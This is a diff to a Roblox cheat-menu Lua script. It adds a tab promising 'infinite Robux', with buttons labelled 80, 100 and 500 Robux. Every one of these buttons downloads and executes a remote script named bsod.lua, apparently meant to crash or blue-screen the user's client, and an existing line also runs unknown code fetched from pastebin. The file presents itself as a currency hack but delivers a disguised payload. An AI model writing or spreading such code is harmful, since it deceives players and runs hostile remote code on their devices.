@@ -326,3 +326,28 @@ Tab:AddButton({
 loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
   end
 })
+local Tab = Window:MakeTab({
+	Name = "无限r币🤑",
+	Icon = "rbxassetid://7734068321",
+	PremiumOnly = false
+})
+Tab:AddButton({
+    Name = "80r币",
+    Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/roblox-bluescreen/main/bsod.lua"))()
+     end 
+})
+
+Tab:AddButton({
+    Name = "100r币",
+    Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/roblox-bluescreen/main/bsod.lua"))()
+     end 
+})
+
+Tab:AddButton({
+    Name = "500r币",
+    Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/roblox-bluescreen/main/bsod.lua"))()
+     end 
+})
